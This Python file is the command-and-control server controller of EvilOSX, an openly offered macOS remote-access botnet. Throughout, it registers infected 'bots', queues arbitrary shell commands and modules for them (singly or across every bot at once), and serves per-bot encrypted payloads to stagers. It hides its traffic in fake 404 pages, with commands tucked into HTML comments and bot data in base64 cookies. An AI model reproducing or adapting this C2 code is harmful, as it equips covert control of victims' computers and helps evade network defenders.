# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import json
from base64 import b64encode, b64decode
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from textwrap import dedent
from threading import Thread
from time import time, strftime, localtime
from urllib.parse import unquote_plus

from urwid import ExitMainLoop

from server import modules
from server.model import Command, CommandType, Bot, RequestType, PayloadFactory
from server.version import VERSION


class Controller:
    """Controls the flow between view and model."""

    def __init__(self, view, model, server_port: int):
        self._view = view
        self._model = model
        self._server_port = server_port

        self._connected_bot = None

        # View startup
        self._view.set_header_text("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, server_port))
        self._view.output("Server started, waiting for connections...", "info")
        self._view.output("Type \"help\" to show the help menu.", "info")

        self._register_listeners()
        self._start_server()

    def _register_listeners(self):
        """Registers the listeners fired by the view."""
        self._view.set_on_command(self._process_command)

    def _start_server(self):
        """Starts the server which communicates with bots (in a separate thread)."""
        # Via __init__ is an absolute pain...
        BotController._model = self._model
        BotController._view = self._view
        BotController._server_port = self._server_port

        server_thread = Thread(target=ThreadedHTTPServer(('', self._server_port), BotController).serve_forever)
        server_thread.daemon = True
        server_thread.start()

    def _process_command(self, command: str):
        """Processes command input."""
        if command.strip() == "":
            return

        self._view.output_separator()

        if command == "help":
            self._view.output("Commands other than the ones listed below will be run on the connected "
                              "bot as a shell command.", "info")
            self._view.output("help                 -  Show this help menu.")
            self._view.output("bots                 -  Show the amount of available bots.")
            self._view.output("connect <id>         -  Start interacting with the bot (required before using \"use\").")
            self._view.output("modules              -  Show a list of available modules.")
            self._view.output("use <module_name>    -  Run the module on the connected bot.")
            self._view.output("stop <module_name>   -  Ask the module to stop executing.")
            self._view.output("setall <module_name> -  Set the module which will be run on every bot.")
            self._view.output("stopall              -  Clear the globally set module.")
            self._view.output("clear                -  Clear the screen.")
            self._view.output("exit/q/quit          -  Close the server and exit.")
        elif command.startswith("bots"):
            if command == "bots":
                bots = self._model.get_bots(limit=10)

                if not bots:
                    self._view.output("There are no available bots.", "attention")
                else:
                    self._view.output("No page specified, showing the first page.", "info")
                    self._view.output("Use \"bots <page>\" to see a different page (each page is 10 results).", "info")

                    for i, bot in enumerate(self._model.get_bots(limit=10)):
                        self._view.output("{} = \"{}@{}\" (last seen: {})".format(
                            str(i), bot.username, bot.hostname,
                            strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
                        ))
            else:
                try:
                    # Show the bots of the given "page".
                    page_number = int(command.split(" ")[1])

                    if page_number <= 0:
                        page_number = 1

                    skip_amount = (page_number * 10) - 10
                    bots = self._model.get_bots(limit=10, skip_amount=skip_amount)

                    if not bots:
                        self._view.output("There are no available bots on this page.", "attention")
                    else:
                        self._view.output("Showing bots on page {}.".format(page_number), "info")

                        for i, bot in enumerate(bots):
                            self._view.output("{} = \"{}@{}\" (last seen: {})".format(
                                str(i), bot.username, bot.hostname,
                                strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
                            ))
                except ValueError:
                    self._view.output("Invalid page number.", "attention")
        elif command.startswith("connect"):
            try:
                specified_id = int(command.split(" ")[1])
                self._connected_bot = self._model.get_bots()[specified_id]

                self._view.output("Connected to \"%s@%s\", ready to send commands." % (
                    self._connected_bot.username, self._connected_bot.hostname
                ), "info")
                self._view.set_footer_text("Command ({}@{}, {}): ".format(
                    self._connected_bot.username, self._connected_bot.hostname, self._connected_bot.local_path
                ))
            except (IndexError, ValueError):
                self._view.output("Invalid bot ID (see \"bots\").", "attention")
                self._view.output("Usage: connect <ID>", "attention")
        elif command == "modules":
            self._view.output("Type \"use <module_name>\" to use a module.", "info")

            special_modules = {
                "remove_bot": "Remove EvilOSX from the bot.",
                "update_bot": "Update the bot to the latest (local) version."
            }

            for module_name in modules.get_names():
                try:
                    info = modules.get_info(module_name)

                    self._view.output("{:16} -  {}".format(module_name, info["Description"]))
                except AttributeError as ex:
                    self._view.output(str(ex), "attention")

            for name, description in special_modules.items():
                self._view.output("{:16} -  {}".format(name, description))
        elif command.startswith("useall"):
            if command == "useall":
                self._view.output("Usage: useall <module_name>", "attention")
                self._view.output("Type \"modules\" to get a list of available modules.", "attention")
            else:
                module_name = command.split(" ")[1]

                module_thread = Thread(target=self._run_module, args=(module_name, True))
                module_thread.daemon = True
                module_thread.start()
        elif command == "clear":
            self._view.clear()
        elif command in ["exit", "q", "quit"]:
            raise ExitMainLoop()
        else:
            # Commands that require a connected bot.
            if not self._connected_bot:
                self._view.output("You must be connected to a bot to perform this action.", "attention")
                self._view.output("Type \"connect <ID>\" to connect to a bot.", "attention")
            else:
                if command.startswith("use"):
                    if command == "use":
                        self._view.output("Usage: use <module_name>", "attention")
                        self._view.output("Type \"modules\" to get a list of available modules.", "attention")
                    else:
                        module_name = command.split(" ")[1]

                        module_thread = Thread(target=self._run_module, args=(module_name,))
                        module_thread.daemon = True
                        module_thread.start()
                else:
                    # Regular shell command.
                    self._view.output("Executing command: {}".format(command), "info")
                    self._model.add_command(self._connected_bot.uid, Command(CommandType.SHELL, command.encode()))

    def _run_module(self, module_name, mass_execute=False):
        """Setup then run the module, required because otherwise calls to prompt block the main thread."""
        if module_name in ["remove_bot", "update_bot"]:
            # Special modules.
            pass
        else:
            try:
                successful, options = modules.get_options(module_name, self._view)

                if not successful:
                    self._view.output("Module setup failed or cancelled.", "attention")
                else:
                    if not options:
                        options = {}
                    options["module_name"] = module_name

                    if mass_execute:
                        bots = self._model.get_bots()
                        code = modules.get_code(module_name)

                        for bot in bots:
                            self._model.add_command(bot.uid, Command(
                                CommandType.MODULE, code, options
                            ))

                        self._view.output("Module added to the queue of {} bots.".format(len(bots)))
                    else:
                        self._model.add_command(self._connected_bot.uid, Command(
                            CommandType.MODULE, modules.get_code(module_name), options
                        ))

                        self._view.output("Module added to the queue of \"{}@{}\".".format(
                            self._connected_bot.username, self._connected_bot.hostname
                        ), "info")
            except ImportError:
                self._view.output("Failed to find module: {}".format(module_name), "attention")
                self._view.output("Type \"modules\" to get a list of available modules.", "attention")


class BotController(BaseHTTPRequestHandler):
    """Handles communicating with bots.

    - Responses are hidden in 404 error pages (the DEBUG part)
    - GET requests are used to retrieve the current command
    - Information about the bot along with the request type is sent (base64 encoded) in the Cookie header
    """
    _model = None
    _view = None
    _server_port = None

    def _send_headers(self):
        """Sets the response headers."""
        self.send_response(404)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _send_command(self, command_raw: str = ""):
        """Sends the command to the bot."""
        response = dedent("""\
        <!DOCTYPE html>
        <HTML>
            <HEAD>
                <TITLE>404 Not Found</TITLE>
            </HEAD>
            <BODY>
                <H1>Not Found</H1>
                The requested URL {} was not found on this server.
                <P>
                <HR>
                <ADDRESS></ADDRESS>
            </BODY>
        </HTML>
        """).format(self.path)

        if command_raw != "":
            response += dedent("""\
            <!--
            DEBUG:\n
            {}DEBUG-->
            """.format(command_raw))

        self._send_headers()
        self.wfile.write(response.encode("latin-1"))

    def _update_bot_amount(self):
        """Updates the bot amount of the view's top header."""
        self._view.set_header_text("EvilOSX v{} | Port: {} | Available bots: {}".format(
            VERSION, self._server_port, self._model.get_bot_amount()
        ))

    def _update_bot_path(self, bot: Bot):
        """Updates the path of the bot."""
        self._view.set_footer_text("Command ({}@{}, {}): ".format(
            bot.username, bot.hostname, bot.local_path
        ))

    def do_GET(self):
        cookie = self.headers.get("Cookie")

        if not cookie:
            self._send_command()
        else:
            # Cookie header format: session=<b64_bot_uid>-<b64_JSON_data>
            bot_uid = b64decode(cookie.split("-")[0].replace("session=", "").encode()).decode()
            data = json.loads(b64decode(cookie.split("-")[1].encode()).decode())
            request_type = int(data["type"])

            if request_type == RequestType.STAGE_1:
                # Send back a uniquely encrypted payload which the stager will run.
                payload_options = data["payload_options"]
                loader_options = data["loader_options"]
                loader_name = loader_options["loader_name"]

                self._view.output_separator()
                self._view.output("[{}] Creating encrypted payload using key: {}".format(
                    loader_options["loader_name"], bot_uid
                ), "info")

                payload = PayloadFactory.create_payload(bot_uid, payload_options, loader_options)
                loader = PayloadFactory.wrap_loader(loader_name, loader_options, payload)

                self._send_command(b64encode(loader.encode()).decode())
            elif request_type == RequestType.GET_COMMAND:
                username = data["username"]
                hostname = data["hostname"]
                local_path = data["path"]

                if not self._model.is_known_bot(bot_uid):
                    # This is the first time this bot connected.
                    self._model.add_bot(Bot(bot_uid, username, hostname, time(), local_path))
                    self._update_bot_amount()

                    self._send_command()
                else:
                    # Update the bot's session (last online and local path).
                    self._model.update_bot(bot_uid, time(), local_path)

                    has_executed_global, global_command = self._model.has_executed_global(bot_uid)

                    if not has_executed_global:
                        self._model.add_executed_global(bot_uid)
                        self._send_command(global_command)
                    else:
                        self._send_command(self._model.get_command_raw(bot_uid))
            else:
                self._send_command()

    def do_POST(self):
        # Command responses.
        data = str(self.rfile.read(int(self.headers.get("Content-Length"))), "utf-8")
        data = json.loads(b64decode(unquote_plus(data.replace("username=", "", 1)).encode()).decode())

        response = b64decode(data["response"])
        module_name = data["module_name"]
        response_options = dict(data["response_options"])

        if module_name:
            try:
                modules.send_response(module_name, response, self._view, response_options)
            except Exception as ex:
                # Something went wrong in the process_response method.
                self._view.output_separator()
                self._view.output("Module server error:", "attention")

                for line in str(ex).splitlines():
                    self._view.output(line)
        else:
            # Command response.
            if response.decode().startswith("Directory changed to"):
                # Update the view's footer to show the updated path.
                new_path = response.decode().replace("Directory changed to: ", "", 1)
                bot_uid = data["bot_uid"]

                self._model.update_bot(bot_uid, time(), new_path)
                self._update_bot_path(self._model.get_bot(bot_uid))

            self._view.output_separator()

            for line in response.splitlines():
                self._view.output(line)

        self._send_command()

    def log_message(self, format, *args):
        return  # Don't log random stuff we don't care about, thanks.


class ThreadedHTTPServer(HTTPServer, ThreadingMixIn):
    """Handles requests in a separate thread."""
